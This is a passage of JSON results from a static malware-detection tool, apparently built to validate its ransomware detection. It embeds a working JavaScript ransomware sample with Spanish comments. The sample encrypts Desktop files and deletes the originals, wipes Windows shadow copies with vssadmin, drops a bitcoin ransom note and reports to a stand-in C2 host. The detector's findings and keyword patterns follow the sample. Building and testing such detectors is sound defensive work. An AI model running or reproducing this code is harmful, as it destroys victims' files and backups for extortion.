        "crypto_keyword": 1,
        "dynamic_code_exec": 1,
        "sensitive_path_ref": 1,
        "self_location_ref": 1,
        "self_location_name": 1
    },
    "amount_findings": 14,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\JavaScript\\vulnerable_sample.js",
    "status": "SUCCESS",
    "language": "JavaScript"
},
{
    "original_code": "// Este es un script de ransomware de ejemplo para la validación del módulo ANTLRDetection.\r\n// Intenta emular un comportamiento malicioso combinando múltiples indicadores.\r\n\r\n// --- 1. Imports para el comportamiento de Cifrado y Manipulación de Archivos ---\r\n// triggers: file_access_import, crypto_import\r\nconst fs = require('fs');\r\nconst path = require('path');\r\nconst crypto = require('crypto');\r\nconst os = require('os');\r\nconst child_process = require('child_process');\r\n\r\n// --- 2. Palabras clave y Strings específicos de ransomware ---\r\n// triggers: crypto_keyword, payment_keyword, ransomware_keywords, locked_extension_keyword\r\nconst ENCRYPTION_KEY = 'clave_secreta_del_ransomware'; // Hardcoded secret\r\nconst RANSOM_NOTE_FILENAME = 'README_TO_DECRYPT.txt';\r\nconst ENCRYPTED_EXTENSION = '.locked';\r\nconst PAYMENT_ADDRESS = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2';\r\nconst RANSOM_MESSAGE = `\r\nTUS ARCHIVOS HAN SIDO CIFRADOS!\r\n\r\nHemos encriptado todos tus archivos importantes. Para restaurar\r\nla recuperacion (recovery) de tus datos, debes realizar un pago (payment)\r\nen bitcoin (bitcoin) a la siguiente direccion: ${PAYMENT_ADDRESS}.\r\n\r\nNo intentes descifrar (decrypt) los archivos por tu cuenta.\r\n`;\r\n\r\n// --- 3. Funciones para la Lógica de Cifrado y Traversal del Sistema de Archivos ---\r\n// triggers: file_traversal, file_read, file_write, crypto_op\r\nfunction encryptFile(filePath) {\r\n    try {\r\n        const fileContent = fs.readFileSync(filePath);\r\n        const algorithm = 'aes-256-cbc';\r\n        const cipher = crypto.createCipheriv(algorithm, ENCRYPTION_KEY.padEnd(32), 'a'.repeat(16));\r\n        \r\n        let encrypted = cipher.update(fileContent);\r\n        encrypted = Buffer.concat([encrypted, cipher.final()]);\r\n\r\n        fs.writeFileSync(filePath + ENCRYPTED_EXTENSION, encrypted);\r\n        fs.unlinkSync(filePath); // trigger: file_delete\r\n        \r\n        console.log(`Fichero encriptado: ${filePath}`);\r\n    } catch (e) {\r\n        // trigger: EMPTY_CATCH_BLOCK\r\n        console.log(`Error al cifrar el archivo: ${e}`);\r\n    }\r\n}\r\n\r\n// Recorrer directorios del usuario\r\n// triggers: file_traversal\r\nfunction traverseAndEncrypt(dir) {\r\n    fs.readdirSync(dir).forEach(file => { // trigger: file_traversal\r\n        const filePath = path.join(dir, file);\r\n        if (fs.statSync(filePath).isFile()) {\r\n            if (filePath.endsWith('.txt') || filePath.endsWith('.jpg')) {\r\n                encryptFile(filePath);\r\n            }\r\n        }\r\n    });\r\n}\r\n\r\n// --- 4. Lógica de Destrucción de Backups y Persistencia ---\r\n// triggers: backup_api_call, self_location_path, os_command_exec\r\nfunction destroyBackups() {\r\n    // Intenta eliminar las copias de seguridad de Windows\r\n    child_process.execSync('vssadmin.exe Delete Shadows /All /Quiet'); // trigger: os_command_exec, backup_api_call\r\n}\r\n\r\nfunction establishPersistence() {\r\n    const currentFilePath = process.execPath; // trigger: self_location_path\r\n    console.log(`Estableciendo persistencia con la ruta: ${currentFilePath}`);\r\n    // Código real aquí para añadirlo al registro o a un archivo de inicio\r\n}\r\n\r\n// --- 5. Lógica de Despliegue de Nota de Rescate y Comunicación C2 ---\r\n// triggers: file_create, ransom_note_filename, bitcoin_ref, network_connection\r\nfunction deployRansomNote() {\r\n    const desktopPath = path.join(os.homedir(), 'Desktop');\r\n    const notePath = path.join(desktopPath, RANSOM_NOTE_FILENAME);\r\n    fs.writeFileSync(notePath, RANSOM_MESSAGE); // trigger: file_write\r\n}\r\n\r\nfunction reportToC2Server() {\r\n    const client = new require('net').Socket(); // trigger: net (network_import)\r\n    client.connect(1337, 'malicious-server.com', () => { // trigger: network_connection\r\n        console.log('Conexión al servidor C&C establecida.');\r\n        client.write(JSON.stringify({ victim: os.hostname(), files: 100 }));\r\n        client.destroy();\r\n    });\r\n}\r\n\r\n\r\n// --- Lógica de Ejecución Principal ---\r\nfunction main() {\r\n    console.log(\"Iniciando operación de ransomware de ejemplo...\");\r\n    \r\n    // Ejecutar lógica de cifrado\r\n    traverseAndEncrypt(path.join(os.homedir(), 'Desktop'));\r\n    \r\n    // Destruir backups\r\n    destroyBackups();\r\n    \r\n    // Desplegar nota de rescate\r\n    deployRansomNote();\r\n    \r\n    // Reportar al servidor C2\r\n    reportToC2Server();\r\n\r\n    // Establecer persistencia\r\n    establishPersistence();\r\n\r\n    console.log(\"Operación completada.\");\r\n}\r\n\r\nmain();",
    "static_findings": [
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Generic cryptography reference. Found in a string literal containing 'crypt'",
            "line": 8,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "HARDCODED_CREDENTIALS",
            "description": "Possible hardcoded credential. Found in a string literal containing 'secret'",
            "line": 14,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": None
        },
        {
            "finding_type": "RANSOM_NOTE_CREATION",
            "description": "Ransomware-related keyword: 'ransom'. Found in a string literal containing 'ransom'",
            "line": 14,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": "ransom_keyword"
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Ransomware-related keyword: 'decrypt'. Found in a string literal containing 'decrypt'",
            "line": 15,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "decrypt_keyword"
        },
        {
            "finding_type": "MASS_FILE_ENCRYPTION",
            "description": "Ransomware file extension. Found in a string literal containing '.locked'",
            "line": 16,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": "extension_change"
        },
        {
            "finding_type": "BACKUP_DESTRUCTION",
            "description": "Recovery-related keyword. Found in a string literal containing 'recovery'",
            "line": 18,
            "severity": "MEDIUM",
            "weight": 0.6,
            "behavioral_trigger": "recovery_keyword"
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Ransomware-related keyword: 'decrypt'. Found in a string literal containing 'decrypt'",
            "line": 18,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "decrypt_keyword"
        },
        {
            "finding_type": "PAYMENT_COMMUNICATION",
            "description": "Ransomware-related keyword: 'bitcoin' (payment). Found in a string literal containing 'bitcoin'",
            "line": 18,
            "severity": "HIGH",
            "weight": 0.9,
            "behavioral_trigger": "bitcoin_ref"
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "AES encryption algorithm. Found in a string literal containing 'aes'",
            "line": 33,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Synchronous file writing. Detected in: 'fs.writeFileSync('",
            "line": 39,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": "file_write"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Synchronous file deletion. Detected in: 'fs.unlinkSync('",
            "line": 40,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "file_delete"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Synchronous directory listing. Detected in: 'fs.readdirSync('",
            "line": 52,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": "file_traversal"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Synchronous command execution. Detected in: 'child_process.execSync('",
            "line": 66,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Synchronous file writing. Detected in: 'fs.writeFileSync('",
            "line": 80,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": "file_write"
        },
        {
            "finding_type": "SYSTEM_INFO_ACCESS",
            "description": "Hostname access. Detected in: 'os.hostname()'",
            "line": 85,
            "severity": "LOW",
            "weight": 0.2,
            "behavioral_trigger": None
        },
        {
            "finding_type": "RANSOM_NOTE_CREATION",
            "description": "Ransomware-related keyword: 'ransom'. Found in a string literal containing 'ransom'",
            "line": 95,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": "ransom_keyword"
        },
        {
            "finding_type": "MASS_FILE_ENCRYPTION",
            "description": "BEHAVIORAL PATTERN FOUND: 'MASS_FILE_ENCRYPTION' (coincidence of the 62.50%). Triggers founded: ['extension_change', 'file_traversal', 'file_write', 'file_delete', 'crypto_keyword'] - Pattern indicating mass file encryption behavior.",
            "line": 0,
            "severity": "CRITICAL",
            "weight": 0.9,
            "percentage_of_pattern": "62.50%"
        }
    ],
    "behavioral_trigger_counts": {
        "crypto_keyword": 2,
        "ransom_keyword": 2,
        "decrypt_keyword": 2,
        "extension_change": 1,
        "recovery_keyword": 1,
        "bitcoin_ref": 1,
        "file_write": 2,
        "file_delete": 1,
        "file_traversal": 1,
        "os_command_exec": 1
    },
    "amount_findings": 17,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\JavaScript\\ransomware_detected.js",
    "status": "SUCCESS",
    "language": "JavaScript"
}
]